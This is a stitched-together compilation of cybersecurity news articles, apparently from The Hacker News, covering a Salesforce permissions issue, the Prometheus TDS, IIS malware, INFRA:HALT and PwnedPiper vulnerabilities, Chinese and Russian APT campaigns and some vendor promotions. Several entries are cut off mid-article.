update creates a data breach risk. All bad actors use 1-day attacks, from script kids to professional ransomware hackers, since weaponizing them is much easier than looking for an unknown vulnerability. Most bad actors look for low-hanging fruits - organizations without updated software or that have lax security. \nThis is why security professionals call the period from vulnerability until the organization enforcing a security update the golden window for attacks. For that reason, it is critical to update all software to the latest stable version and install security updates as soon as possible.\nThe case of access control for guest users\nThis is not just a hypothetical or interesting story. In October of 2020, security researcher Aaron Costello discovered that access control permission settings in Salesforce might allow unauthenticated users (“guest users“) to access more information than intended by using cumulative weaknesses in Salesforce, including\nold and not secure Salesforce instances, problematic default configurations, complicity and advanced abilities of “@AuraEnabled“ methods. \nSalesforce suggested security measures for guest users, objects, and APIs, while also pushing Security Updates in the following Winter ’21 and Spring ’21 releases.\nAmong the Security Updates were Remove View All Users Permission from Guest User Profiles and Reduce Object Permissions for Guest Users. \nBoth suggestions directly address the security threat’s root cause. Problematically, this was too little too late because bad actors had known about the vulnerability since October 2020. By the time Salesforce pushed the updates to the different tenants, the admins needed to activate the updates manually. This means that a customer might have been at risk for anywhere from 6 - 9 months before fixing the vulnerability themselves.\nThe security team’s responsibility for Salesforce Security\nWhile Salesforce provides value to organizations, its approach to managing security updates makes it a unique type of SaaS. Additionally, it is an extremely complex system with thousands of configurations. While many don’t seem important to security, they can actually impact a Salesforce tenant’s posture. \nTherefore, the CISO or security team needs to be involved more than they normally would when managing Salesforce. They need to: \nmake sure configurations are done with security in mind, monitor changes, make sure updates don’t worsen the organization’s security posture, insist that Security Updates are installed as soon as possiblemake sure that the security hygiene of the Salesforce tenant is good. \nFortunately, the category of SaaS Security Posture Management (SSPM) tools address these tasks, and Adaptive Shield is a market-leading solution in this category to enable optimal SaaS security posture automatically.\nHow can Adaptive Shield help secure Salesforce?\nAdaptive Shield understands the complexity of securing Salesforce, among many other SaaS platforms, as Adaptive Shield provides an enterprise’s security teams complete control of their organizations’ SaaS apps with visibility, detailed insights, and remediation across all SaaS apps. \nThe platform helps Salesforce admins, CISOs, and security teams track and monitor the settings and configuration updateswith security checks that ensure that the Salesforce tenant is configured and secured properly. This includes monitoring permissions, “@AuraEnabled“ methods, API security, and authentication. \nAdaptive Shield also provides clear priority-based mitigation information so admins and security teams can swiftly secure the Salesforce tenant to maintain a strong security posture. The Adaptive Shield platform makes the task of securing a Salesforce tenant from cumbersome, complex, and time-consuming — to an easy, clear, quick, and manageable experience. This prevents such vulnerabilities as the example above by breaking the chain of misconfigurations and unenforced updates. \nGet in touch to ensure your Salesforce, or any other SaaS app, is secure today.\nNote: This article is written by Hananel Livneh, Senior Product Analyst at Adaptive Shield.\n\n\nFound this article interesting?

'text': 'Multiple cybercriminal groups are leveraging a malware-as-a-service (MaaS) solution to carry out a wide range of malicious software distribution campaigns that result in the deployment of payloads such as Campo Loader, Hancitor, IcedID, QBot, Buer Loader, and SocGholish against individuals in Belgium as well as government agencies, companies, and corporations in the U.S.\nDubbed “Prometheus“ and available for sale on underground platforms for $250 a month since August 2020, the service is a Traffic Direction System (TDS) that’s designed to distribute malware-laced Word and Excel documents, and divert users to phishing and malicious sites, according to a Group-IB report shared with The Hacker News.\nMore than 3,000 email addresses are said to have been singled out via malicious campaigns in which Prometheus TDS was used to send malicious emails, with banking and finance, retail, energy and mining, cybersecurity, healthcare, IT, and insurance emerging the prominent verticals targeted by the attacks.\n“Prometheus TDS is an underground service that distributes malicious files and redirects visitors to phishing and malicious sites,“ Group-IB researchers said. “This service is made up of the Prometheus TDS administrative panel, in which an attacker configures the necessary parameters for a malicious campaign: downloading malicious files, and configuring restrictions on users’ geolocation, browser version, and operating system.“\nThe service is also known to employ third-party infected websites that are manually added by the campaign’s operators and act as a middleman between the attacker’s administrative panel and the user. To achieve this, a PHP file named “Prometheus.Backdoor“ is uploaded to the compromised website to collect and send back data about the victim, based on which a decision is taken as to whether to send the payload to the user and/or to redirect them to the specified URL.\nThe attack scheme commences with an email containing a HTML file, a link to a web shell that redirects users to a specified URL, or a link to a Google Doc that’s embedded with an URL that redirects users to the malicious link that when either opened or clicked leads the recipient to the infected website, which stealthily collects basic information (IP address, User-Agent, Referrer header, time zone, and language data) and then forwards this data to the Prometheus admin panel.\n\nIn the final phase, the administrative panel takes responsibility for sending a command to redirect the user to a particular URL, or to send a malware-ridden Microsoft Word or Excel document, with the user redirected to a legitimate site like DocuSign or USPS immediately after downloading the file to mask the malicious activity. Besides distributing malicious files, researchers found that Prometheus TDS is also used as a classic TDS to redirect users to specific sites, such as fake VPN websites, dubious portals selling Viagra and Cialis, and banking phishing sites.\n“Prometheus TDS also redirected users to sites selling pharmaceutical products,“ the researchers noted. “Operators of such sites often have affiliate and partnership programs. Partners, in turn, often resort to aggressive SPAM campaigns in order to increase the earnings within the affiliate program. Analysis of the Prometheus infrastructure by Group-IB specialists revealed links that redirect users to sites relating to a Canadian pharmaceutical company.“\n\n\nFound this article interesting?

While Mitsubishi Electric is expected to release a fixed version of the firmware in the “near future,“ it has published a series of mitigations that are aimed at protecting the operational environments and stave off a possible attack.\n\nStating that it’s currently investigating the authentication bypass vulnerability concerning how sessions are managed, the company is recommending a combination of mitigation measures to minimize the risk of potential exploitation, including using a firewall to prevent unsanctioned access over the internet, an IP filter to restrict accessible IP addresses, and changing the passwords via USB.\n“It’s likely that the types of issues we uncovered affect the authentication of OT protocols from more than a single vendor, and we want to help protect as many systems as possible,“ the researchers noted. “Our general concern is that asset owners might be overly reliant on the security of the authentication schemes bolted onto OT protocols, without knowing the technical details and the failure models of these implementations.“\n\n\nFound this article interesting?

CVE-2021-1610, concerns a command injection vulnerability that, if exploited, could permit an authenticated adversary to remotely execute arbitrary commands with root privileges on an affected device, the company noted in its advisory.\nSwing of Chaitin Security Research Lab has been credited with reporting the two shortcomings.\nAlso addressed by Cisco is a high-severity remote code execution bug (CVE-2021-1602, CVSS score: 8.2) impacting Small Business RV160, RV160W, RV260, RV260P, and RV260W VPN Routers that could be leveraged by an unauthenticated, remote attacker to execute arbitrary commands on the underlying operating system of an affected device. Small Business RV Series Routers running firmware versions earlier than 1.0.01.04 are susceptible.\n\n“This vulnerability is due to insufficient user input validation. An attacker could exploit this vulnerability by sending a crafted request to the web-based management interface,“ Cisco said. “A successful exploit could allow the attacker to execute arbitrary commands on an affected device using root-level privileges. Due to the nature of the vulnerability, only commands without parameters can be executed.“\nThe company noted there’s been no evidence of active exploitation attempts in the wild for any of these flaws, nor are there any workarounds that address the vulnerabilities.\nCVE-2021-1602 marks the second time Cisco has fixed critical remote code execution flaws concerning the same set of VPN appliances. Earlier this February, the company patched 35 flaws that could potentially allow an unauthenticated, remote attacker to execute arbitrary code as the root user on an affected device.\n\n\nFound this article interesting?

{'title': 'Several Malware Families Targeting IIS Web Servers With Malicious Modules',
'text': 'A systematic analysis of attacks against Microsoft’s Internet Information Services (IIS) servers has revealed as many as 14 malware families, 10 of them newly documented, indicating that the Windows-based web server software continues to be a hotbed for natively developed malware for close to eight years.\nThe findings were presented today by ESET malware researcher Zuzana Hromcova at the Black Hat USA security conference.\n“The various kinds of native IIS malware identified are server-side malware and the two things it can do best is, first, see and intercept all communications to the server, and second, affect how the requests are processed,“ Hromcova told in an interview with The Hacker News. “Their motivations range from cybercrime to espionage, and a technique called SEO fraud.“\nGovernment institutions in three Southeast Asian countries, a major telecommunications company in Cambodia, and a research institution in Vietnam, as well as dozens of private companies in a range of industries, located mostly in Canada, Vietnam and India, the U.S., New Zealand, and South Korea, are believed to have been the target of IIS malware.\n\nIIS is an extensible web server software developed by Microsoft, enabling developers to take advantage of its modular architecture to incorporate additional IIS modules that expand on its core functionality.\n“It comes as no surprise that the same extensibility is attractive for malicious actors – to intercept network traffic, steal sensitive data or serve malicious content,“ according to an ESET whitepaper detailing the anatomy of the diverse class of threats, which operate by eavesdropping on and tampering with the server’s communications.\n“Moreover, it is quite rare for endpoint (and other) security software to run on IIS servers, which makes it easy for attackers to operate unnoticed for long periods of time. This should be disturbing for all serious web portals that want to protect their visitors’ data, including authentication and payment information.“\nIIS malware phases\nBy collecting over 80 malware samples, the study grouped them into 14 unique families (Group 1 to Group 14), most of which were detected for the first time between 2018 and 2021 and are undergoing active development to date. While they may not exhibit any connection to one another, what’s common among all the 14 malware families is that they are all developed as malicious native IIS modules.\n\n“In all cases, the main purpose of IIS malware is to process HTTP requests incoming to the compromised server and affect how the server responds to (some of) these requests – how they are processed depends on malware type,“ Hromcova explained. The malware families have been found to operate in one of the five modes -\nBackdoor mode - remotely control the compromised computer with IIS installedInfostealer mode - intercept regular traffic between the compromised server and its legitimate visitors, to steal information such as login credentials and payment informationInjector mode - modify HTTP responses sent to legitimate visitors to serve malicious contentProxy mode - turn the compromised server into an unwitting part of command-and-control (C2) infrastructure for another malware family, and relay communication between victims and the actual C2 serverSEO fraud mode - modify the content served to search engine crawlers in order to artificially boost ranking for selected websites (aka doorway pages)\nInfections involving IIS malware typically hinge on server administrators inadvertently installing a trojanized version of a legitimate IIS module or when an adversary is able to get access to the server by exploiting a configuration weakness or vulnerability in a web application or the server, using it to install the malware-laced IIS module.\ninfostealing mechanism\nIndeed, after Microsoft released out-of-band patches for ProxyLogon flaws affecting Microsoft Exchange Server 2013, 2016, and 2019 earlier this March, it was not long before multiple advanced persistent threat (APT) groups joined in the attack frenzy, with ESET observing four email servers located in Asia and South America that were compromised to deploy web shells that served as a channel to install IIS backdoors.\n\nThis is far from the first time Microsoft web server software has emerged a lucrative target for threat actors. Last month, researchers from Israeli cybersecurity firm Sygnia disclosed a series of targeted cyber intrusion attacks undertaken by an advanced, stealthy adversary known as Praying Mantis targeting internet-facing IIS servers to infiltrate high-profile public and private entities in the U.S.\nVictims of native IIS modules spread via the ProxyLogon vulnerability chain\nTo prevent compromise of IIS servers, it’s recommended to use dedicated accounts with strong, unique passwords for administration-related purposes, install native IIS modules only from trusted sources, reduce the attack surface by limiting the services that are exposed to the internet, and use a web application firewall for an extra layer of security.\n“One of the most surprising aspects of the investigation is how versatile IIS malware is, and the [detection of] SEO fraud criminal scheme, where malware is misused to manipulate search engine algorithms and help boost the reputation of third-party websites,“ Hromcova said. “We haven’t seen anything like that before.“\n\n\nFound this article interesting?

{'title': 'Russian Federal Agencies Were Attacked With Chinese Webdav-O Virus',
'text': 'An amalgam of multiple state-sponsored threat groups from China may have been behind a string of targeted attacks against Russian federal executive authorities in 2020.\nThe latest research, published by Singapore-headquartered company Group-IB, delves into a piece of computer virus called “Webdav-O“ that was detected in the intrusions, with the cybersecurity firm observing similarities between the tool and that of popular Trojan called “BlueTraveller,“ that’s known to be connected to a Chinese threat group called TaskMasters and deployed in malicious activities with the aim of espionage and plundering confidential documents.\n\n“Chinese APTs are one of the most numerous and aggressive hacker communities,“ researchers Anastasia Tikhonova and Dmitry Kupin said. “Hackers mostly target state agencies, industrial facilities, military contractors, and research institutes. The main objective is espionage: attackers gain access to confidential data and attempt to hide their presence for as long as possible.“\nThe report builds on a number of public disclosures in May from Solar JSOC and SentinelOne, both of which disclosed a malware called “Mail-O“ that was also observed in attacks against Russian federal executive authorities to access the cloud service Mail.ru, with SentinelOne tying it to a variant of another well-known malicious software called “PhantomNet“ or “SManager“ used by a threat actor dubbed TA428.\n\n“The main goal of the hackers was to completely compromise the IT infrastructure and steal confidential information, including documents from closed segments and email correspondence of key federal executive authorities,“ Solar JSOC noted, adding the “cybercriminals ensured themselves a high level of secrecy through the use of legitimate utilities, undetectable malware, and a deep understanding of the specifics of the work of information protection tools installed in government bodies.“\nGroup-IB’s analysis centers on a Webdav-O sample that was uploaded to VirusTotal in November 2019 and the overlaps it shares with the malware sample detailed by Solar JSOC, with the researchers finding the latter to be a newer, partially improvised version featuring added capabilities. The detected Webdav-O sample has also been linked to the BlueTraveller trojan, citing source code similarities and the manner in which commands are processed.\n\nWhat’s more, further investigation into TA428’s toolset has revealed numerous commonalities between BlueTraveller and a nascent malware strain named “Albaniiutas“ that was attributed to the threat actor in December 2020, implying that not only is Albaniiutas an updated variant of BlueTraveller, but also that Webdav-O malware is a version of BlueTraveller.\n“It is noteworthy that Chinese hacker groups actively exchange tools and infrastructure, but perhaps it is just the case here,“ the researchers said. “This means that one Trojan can be configured and modified by hackers from different departments with different levels of training and with various objectives. Either both Chinese hacker groups (TA428 and TaskMasters) attacked Russian federal executive authorities in 2020 or that there is one united Chinese hacker group made up of different units.“\n\n\nFound this article interesting?

'text': 'Cybersecurity researchers on Wednesday disclosed 14 vulnerabilities affecting a commonly-used TCP/IP stack used in millions of Operational Technology (OT) devices manufactured by no fewer than 200 vendors and deployed in manufacturing plants, power generation, water treatment, and critical infrastructure sectors.\nThe shortcomings, collectively dubbed “INFRA:HALT,“ target NicheStack, potentially enabling an attacker to achieve remote code execution, denial of service, information leak, TCP spoofing, and even DNS cache poisoning.\nNicheStack (aka InterNiche stack) is a closed-source TCP/IP stack for embedded systems that is designed to provide internet connectivity industrial equipment, and is incorporated by major industrial automation vendors like Siemens, Emerson, Honeywell, Mitsubishi Electric, Rockwell Automation, and Schneider Electric in their programmable logic controllers (PLCs) and other products.\n\n“Attackers could disrupt a building’s HVAC system or take over the controllers used in manufacturing and other critical infrastructure,“ researchers from JFrog and Forescout said in a joint report published today. “Successful attacks can result in taking OT and ICS devices offline and having their logic hijacked. Hijacked devices can spread malware to where they communicate on the network.“\n\nAll versions of NicheStack before version 4.3 are vulnerable to INFRA:HALT, with approximately 6,400 OT devices exposed online and connected to the internet as of March 2021, most of which are located in Canada, the U.S., Spain, Sweden, and Italy.\n\nThe list of 14 flaws is as follows -\nCVE-2020-25928 (CVSS score: 9.8) - An out-of-bounds read/write when parsing DNS responses, leading to remote code executionCVE-2021-31226 (CVSS score: 9.1) - A heap buffer overflow flaw when parsing HTTP post requests, leading to remote code executionCVE-2020-25927 (CVSS score: 8.2) - An out-of-bounds read when parsing DNS responses, leading to denial-of-serviceCVE-2020-25767 (CVSS score: 7.5) - An out-of-bounds read when parsing DNS domain names, leading to denial-of-service and information disclosureCVE-2021-31227 (CVSS score: 7.5) - A heap buffer overflow flaw when parsing HTTP post requests, leading to denial-of-serviceCVE-2021-31400 (CVSS score: 7.5) - An infinite loop scenario in the TCP out of band urgent data processing function, causing a denial-of-serviceCVE-2021-31401 (CVSS score: 7.5) - An integer overflow flaw in the TCP header processing codeCVE-2020-35683 (CVSS score: 7.5) - An out-of-bounds read when parsing ICMP packets, leading to denial-of-serviceCVE-2020-35684 (CVSS score: 7.5) - An out-of-bounds read when parsing TCP packets, leading to denial-of-serviceCVE-2020-35685 (CVSS score: 7.5) - Predictable initial sequence numbers (ISNs) in TCP connections, leading to TCP spoofingCVE-2021-27565 (CVSS score: 7.5) - A denial-of-service condition upon receiving an unknown HTTP requestCVE-2021-36762 (CVSS score: 7.5) - An out-of-bounds read in the TFTP packet processing function, leading to denial-of-serviceCVE-2020-25926 (CVSS score: 4.0) - The DNS client does not set sufficiently random transaction IDs, causing cache poisoningCVE-2021-31228 (CVSS score: 4.0) - The source port of DNS queries can be predicted to send forged DNS response packets, causing cache poisoning\n\nThe disclosures mark the sixth time security weaknesses have been identified in the protocol stacks that underpin millions of internet-connected devices.

{'title': 'Chinese Hackers Target Major Southeast Asian Telecom Companies',
'text': 'Three distinct clusters of malicious activities operating on behalf of Chinese state interests have staged a series of attacks to target networks belonging to at least five major telecommunications companies located in Southeast Asian countries since 2017.\n“The goal of the attackers behind these intrusions was to gain and maintain continuous access to telecommunication providers and to facilitate cyber espionage by collecting sensitive information, compromising high-profile business assets such as the billing servers that contain Call Detail Record (CDR) data, as well as key network components such as the Domain Controllers, Web Servers and Microsoft Exchange servers,“ Cybereason’s Lior Rochberger, Tom Fakterman, Daniel Frank, and Assaf Dahan revealed in a technical analysis published Tuesday.\n\nThe Boston-based cybersecurity firm linked the campaigns, collectively named “DeadRinger,“ to three different Chinese threat actors, namely Gallium (aka Soft Cell), Naikon APT (aka APT30 or Lotus Panda), and TG-3390 (aka APT27 or Emissary Panda).\nThe activity surrounding the latter of the three clusters started in 2017, while Gallium-related attacks were first observed in Q4 2020, with the Naikon group jumping on the exploitation bandwagon last in Q4 2020. The three espionage operations are believed to have continued all the way to mid-2021.\n\nCalling the attackers “highly adaptive,“ the researchers called out their diligent efforts to stay under the radar and maintain persistence on the infected endpoints, while simultaneously shifting tactics and updating their defensive measures to compromise and backdoor unpatched Microsoft Exchange email servers using the ProxyLogon exploits that came to light earlier this March.\n“Each phase of the operation demonstrates the attackers’ adaptiveness in how they responded to various mitigation efforts, changing infrastructure, toolsets, and techniques while attempting to become more stealthy,“ the researchers noted.\n\nNaikon, on the other hand, was found to leverage a backdoor named “Nebulae“ as well as a previously undocumented keylogger dubbed “EnrollLoger“ on selected high-profile assets. It’s worth pointing out that Naikon’s use of Nebulae first emerged in April 2021 when the adversary was attributed as behind a wide-ranging cyber-espionage campaign targeting military organizations in Southeast Asia.\n\nRegardless of the attack chain, a successful compromise triggered a sequence of steps, enabling the threat actors to perform network reconnaissance, credential theft, lateral movement, and data exfiltration. \nThe Emissary Panda cluster is the oldest of the three, primarily involving the deployment of a custom .NET-based OWA (Outlook Web Access) backdoor, which is used to pilfer credentials of users logging into Microsoft OWA services, granting the attackers the ability to access the environment stealthily.\nAlso of note is the overlap among the clusters in terms of the victimology and the use of generic tools like Mimikatz, with the three groups detected in the same target environment, around the same timeframe, and even on the same systems in some instances.\n“At this point, there is not enough information to determine with certainty the nature of this overlap — namely, whether these clusters represent the work of three different threat actors working independently, or whether these clusters represent the work of three different teams operating on behalf of a single threat actor,“ the researchers said.\n“A second hypothesis is that there are two or more Chinese threat actors with different agendas / tasks that are aware of each other’s work and potentially even working in tandem.“\n\n\nFound this article interesting?

'text': 'As cyber incidents increase in scope and impact, more and more organizations come to realize that outsourcing their defenses is the best practice—significantly increasing the Managed Security Service Provider (MSSP) market opportunities.\n\nUntil recently, IT integrators, VARs, and MSPs haven’t participated in the growing and profitable MSSP market as it entailed massive investments in building an in-house skilled security team. \n\nHowever, this is beginning to change as a result of certain security vendors, like Cynet, that provide a purpose-built partner offering that enables IT integrators, VARs, and MSPs to provide managed security service with zero investment in hardware or personnel.\n\nTheir offering includes a 24/7 SOC that trains and supports the partner’s existing team and a security platform that consolidates and automates breach protection (including endpoint, user, and network security), making it simple to operate by any IT professional. \n\nTo learn more about the Cynet partner offering, click here.\n\n\nThe barriers to becoming an MSSP\n\nThe main obstacle to entering the MSSP market is a lack of prior security experience. Responsibility for an organization’s breach protection is not taken lightly, making many IT service providers cautious about offering security services without skilled professionals at hand.\n\nThe difficulties in finding such professionals are the main reason why a standard IT provider is barred out from becoming an MSSP. Be that as it may, many re-sellers and managed service providers understand that the way to grow their revenues and especially their profitability is by adding managed security services. \n\n\nConsolidation and automation – the path to MSSP  \n\nSecurity consolidation and automation appeal to security services newcomers because they shift breach protection workflows such as investigations and remediations from being dependent on manual skill to a product functionality that can be performed regardless of prior security skill and experience.\n\nThis switch changes the rules of the security game in many aspects. Mainly, it expands the MSSP field, making it available and relevant to a broader audience of IT service providers. \n\nTaking a further look at Cynet’s partner offering, it’s clear that it significantly lowers the entry barriers for re-sellers, integrators, and managed service providers to provide managed security services, through the following features: \n\n\nCloud-native solution with no hardware to purchase, deploy and integrate Purpose-built platform to radically simplify security operations, Cynet 360 can be efficiently operated by any IT professional without the need for specialized security proficiency – which means there is no need to hire a new expert team. Cynet’s platform includes the functionalities of all core security products – AV, NGAV, EDR, Network Traffic Analytics, Deception, and User Behavior Analysis (UBA). As such, it enables the MSSP to provide an extensive range of security needs to its existing client base. Cynet automates the remediation needs for infected hosts, malicious files, compromised user accounts, and unsafe network traffic, with a wide range of response orchestration capabilities. Apart from being a key capability differentiator, response automation removes operational burdens from the MSSP, increasing its team’s capacity. Cynet’s partner offering includes CyOps – a 24\7 security team that provides full on-boarding and training for the partner staff, as well as performs alert monitoring, threat hunting, and attacks investigation for the partner’s customers. Practically this means that the MSSP gains an additional highly skilled workforce that ensures its customers get the best of breach protection. \n\n\nLearn more about becoming an MSSP with Cynet 360.\n\n\nFound this article interesting?

'text': 'Cybersecurity researchers on Monday disclosed a set of nine vulnerabilities known as “PwnedPiper“ that left a widely-used pneumatic tube system (PTS) vulnerable to critical attacks, including a possibility of complete takeover.\nThe security weaknesses, disclosed by American cybersecurity firm Armis, impact the Translogic PTS system by Swisslog Healthcare, which is installed in about 80% of all major hospitals in North America and in no fewer than 3,000 hospitals worldwide.\n\n“These vulnerabilities can enable an unauthenticated attacker to take over Translogic PTS stations and essentially gain complete control over the PTS network of a target hospital,“ Armis researchers Ben Seri and Barak Hadad said. “This type of control could enable sophisticated and worrisome ransomware attacks, as well as allow attackers to leak sensitive hospital information.“\nPneumatic tube systems are internal logistics and transport solutions that are used to securely transport blood, tissue, and lab samples in hospital settings to diagnostic laboratories.\n\nSuccessful exploitation of the issues, therefore, could result in leakage of sensitive information, enable an adversary to manipulate data, and even compromise the PTS network to carry out a man-in-the-middle (MitM) attack and deploy ransomware, thereby effectively halting the operations of the hospital.\n\nThe details about the nine PwndPiper vulnerabilities are listed as follows -\nCVE-2021-37161 – Underflow in udpRXThreadCVE-2021-37162 – Overflow in sccProcessMsgCVE-2021-37163 – Two hardcoded passwords accessible through the Telnet serverCVE-2021-37164 – Off-by-three stack overflow in tcpTxThreadCVE-2021-37165 – Overflow in hmiProcessMsgCVE-2021-37166 – GUI socket Denial Of ServiceCVE-2021-37167 – User script run by root can be used for PECVE-2021-37160 – Unauthenticated, unencrypted, unsigned firmware upgrade\nIn a nutshell, the flaws — which concern privilege escalation, memory corruption, and denial-of-service — could be abused to gain root access, achieve remote-code-execution, or render systems unavailable, and worse, permit an attacker to maintain persistence on compromised PTS stations via an insecure firmware upgrade procedure, leading to unauthenticated remote-code-execution. It’s also worth noting that a patch for CVE-2021-37160 is expected to be shipped at a future date.\n\n“The potential for pneumatic tube stations (where the firmware is deployed) to be compromised is dependent on a bad actor who has access to the facility’s information technology network and who could cause additional damage by leveraging these exploits,“ Swisslog Healthcare said in an independent advisory published today.\nTranslogic PTS system customers are highly recommended to update to the latest firmware (Nexus Control Panel version 7.2.5.7) to mitigate any potential risk that may arise out of real-world exploitation of the shortcomings.\n“This research sheds light on systems that are hidden in plain sight but are nevertheless a crucial building block to modern-day healthcare,“ Seri and Hadad said. “Understanding that patient care depends not only on medical devices, but also on the operational infrastructure of a hospital is an important milestone to securing healthcare environments.“\n\n\nFound this article interesting?

The toolset is completely volatile, reflectively loaded into an affected machine’s memory and leaves little-to-no trace on infected targets,“ the researchers said. “The threat actor also uses an additional stealthy backdoor and several post-exploitations modules to perform network reconnaissance, elevate privileges, and move laterally within networks.“ \n\nBesides exhibiting capabilities that show a significant effort to avoid detection by actively interfering with logging mechanisms and successfully evading commercial endpoint detection and response (EDR) systems, the threat actor has been known to leverage an arsenal of ASP.NET web application exploits to gain an initial foothold and backdoor the servers by executing a sophisticated implant named “NodeIISWeb“ that’s designed to load custom DLLs as well as intercept and handle HTTP requests received by the server.\n\nThe vulnerabilities that are taken advantage of by the actor include:\nCheckbox Survey RCE Exploit (CVE-2021-27852)VIEWSTATE Deserialization ExploitAltserialization Insecure DeserializationTelerik-UI Exploit (CVE-2019-18935 and CVE-2017-11317)\n\nInterestingly, Sygnia’s investigation into TG1021’s tactics, techniques, and procedures (TTPs) have unearthed “major overlaps“ to those of a nation-sponsored actor named “Copy-Paste Compromises,“ as detailed in an advisory released by the Australian Cyber Security Centre (ACSC) in June 2020, which described a cyber campaign targeting public-facing infrastructure primarily through the use of unpatched flaws in Telerik UI and IIS servers. However, a formal attribution is yet to be made.\n“Praying Mantis, which has been observed targeting high-profile public and private entities in two major Western markets, exemplifies a growing trend of cyber criminals using sophisticated, nation-state attack methods to target commercial organizations,“ the researchers said. “Continuous forensics activities and timely incident response are essential to identifying and effectively defending networks from attacks by similar threat actors.“\n\n\nFound this article interesting?

He was awarded a total of $3,000 as part of the bug bounty program.\n\nThe list of three vulnerabilities is as follows -\nVulnerability in Legacy Document Deletion on PyPI - An exploitable vulnerability in the mechanisms for deleting legacy documentation hosting deployment tooling on PyPI, which would allow an attacker to remove documentation for projects not under their control.Vulnerability in Role Deletion on PyPI - An exploitable vulnerability in the mechanisms for deleting roles on PyPI was discovered by a security researcher, which would allow an attacker to remove roles for projects not under their control.Vulnerability in GitHub Actions workflow for PyPI - An exploitable vulnerability in a GitHub Actions workflow for PyPI’s source repository could allow an attacker to obtain write permissions against the pypa/warehouse repository.\nSuccessful exploitation of the flaws could result in the arbitrary deletion of project documentation files, which has to do with how the API endpoint for removing legacy documentation handles project names passed as input, and enable any user to delete any role given a valid role ID due to a missing check that requires the current project to match the project the role is associated with.\n\nA more critical flaw concerns an issue in the GitHub Actions workflow for PyPI’s source repository named “combine-prs.yml,“ resulting in a scenario wherein an adversary could obtain write permission for the main branch of the “pypa/warehouse“ repository, and in the process execute malicious code on pypi.org.\n“The vulnerabilities described in this article had a significant impact on the Python ecosystem,“ RyotaK noted. “As I’ve mentioned several times before, some supply chains have critical vulnerabilities. However, a limited number of people are researching supply chain attacks, and most supply chains are not properly protected.

'text': 'Healthcare and education sectors are the frequent targets of a new surge in credential harvesting activity from what’s a “highly modular“ .NET-based information stealer and keylogger, charting the course for the threat actor’s continued evolution while simultaneously remaining under the radar.\nDubbed “Solarmarker,“ the malware campaign is believed to be active since September 2020, with telemetry data pointing to malicious actions as early as April 2020, according to Cisco Talos. “At its core, the Solarmarker campaign appears to be conducted by a fairly sophisticated actor largely focused on credential and residual information theft,“ Talos researchers Andrew Windsor and Chris Neal said in a technical write-up published last week.\n\nInfections consist of multiple moving parts, chief among them being a .NET assembly module that serves as a system profiler and staging ground on the victim host for command-and-control (C2) communications and further malicious actions, including the deployment of information-stealing components like Jupyter and Uran (likely a reference to Uranus). \nWhile the former boasts of capabilities to steal personal data, credentials, and form submission values from the victim’s Firefox and Google Chrome browsers, the latter — a previously unreported payload — acts as a keylogger to capture the user’s keystrokes.\n\nThe renewed activity has also been accompanied by a shift in tactics and multiple iterations to the infection chain, even as the threat actor latched on to the age-old trick of SEO poisoning, which refers to the abuse of search engine optimization (SEO) to gain more eyeballs and traction to malicious sites or make their dropper files highly visible in search engine results.\n\n“Operators of the malware known as SolarMarker, Jupyter, [and] other names are aiming to find new success using an old technique: SEO poisoning,“ the Microsoft Security Intelligence team disclosed in June. “They use thousands of PDF documents stuffed w/ SEO keywords and links that start a chain of redirections eventually leading to the malware.\n\nTalos’ static and dynamic analysis of Solarmarker’s artifacts points to a Russian-speaking adversary, although the threat intelligence group suspects the malware creators could have intentionally designed them in such a manner in an attempt to mislead attribution.\n“The actor behind the Solarmarker campaign possesses moderate to advanced capabilities,“ the researchers concluded. “Maintaining the amount of interconnected and rotating infrastructure and generating a seemingly limitless amount of differently named initial dropper files requires substantial effort.“\n“The actor also exhibits determination in ensuring the continuation of their campaign, such as updating the encryption methods for the C2 communication in the Mars DLL after researchers had publicly picked apart previous components of the malware, in addition to the more typical strategy of cycling out the C2 infrastructure hosts.“.\n\n\nFound this article interesting?

{'title': 'Experts Uncover Several C&C Servers Linked to WellMess Malware',
'text': 'Cybersecurity researchers on Friday unmasked new command-and-control (C2) infrastructure belonging to the Russian threat actor tracked as APT29, aka Cozy Bear, that has been spotted actively serving WellMess malware as part of an ongoing attack campaign.\nMore than 30 C2 servers operated by the Russian foreign intelligence have been uncovered, Microsoft-owned cybersecurity subsidiary RiskIQ said in a report shared with The Hacker News.\nAPT29, the moniker assigned to government operatives working for Russia’s Foreign Intelligence Service (SVR), is believed to have been the mastermind behind the massive SolarWinds supply chain attack that came to light late last year, with the U.K. and U.S. governments formally pinning the intrusions on Russia earlier this April.\n\nThe activity is being tracked by the cybersecurity community under various codenames, including UNC2452 (FireEye), Nobelium (Microsoft), SolarStorm (Unit 42), StellarParticle (Crowdstrike), Dark Halo (Volexity), and Iron Ritual (Secureworks), citing differences in the tactics, techniques, and procedures (TTPs) employed by the adversary with that of known attacker profiles, counting APT29.\nFirst identified by Japan’s JPCERT/CC in 2018, WellMess (aka WellMail) has been previously deployed in espionage campaigns undertaken by the threat actor to plunder intellectual property from multiple organizations involved in COVID-19 research and vaccine development in the U.K., U.S., and Canada. \n“The group uses a variety of tools and techniques to predominantly target governmental, diplomatic, think-tank, healthcare and energy targets for intelligence gain,“ the U.K.’s National Cyber Security Centre (NCSC) noted in an advisory published in July 2020.\n\nRiskIQ said it began its investigation into APT29’s attack infrastructure following a public disclosure about a new WellMess C2 server on June 11, leading to the discovery of a cluster of no fewer than 30 active C2 servers. One of the servers is believed to have been active as early as October 9, 2020, although it’s not clear how these servers are being used or who the targets are.\nThis is not the first time RiskIQ has identified the command-and-control footprint associated with the SolarWinds hackers. In April, it unearthed an additional set of 18 servers with high confidence that likely communicated with the targeted, secondary Cobalt Strike payloads delivered via the TEARDROP and RAINDROP malware deployed in the attacks.\n“RiskIQ’s Team Atlas assesses with high confidence that these IP addresses and certificates are in active use by APT29,“ said Kevin Livelli, RiskIQ’s director of threat intelligence. “We were unable to locate any malware which communicated with this infrastructure, but we suspect it is likely similar to previously identified samples.“\n\n\nFound this article interesting?

{'title': 'A New Wiper Malware Was Behind Recent Cyberattack On Iranian Train System',
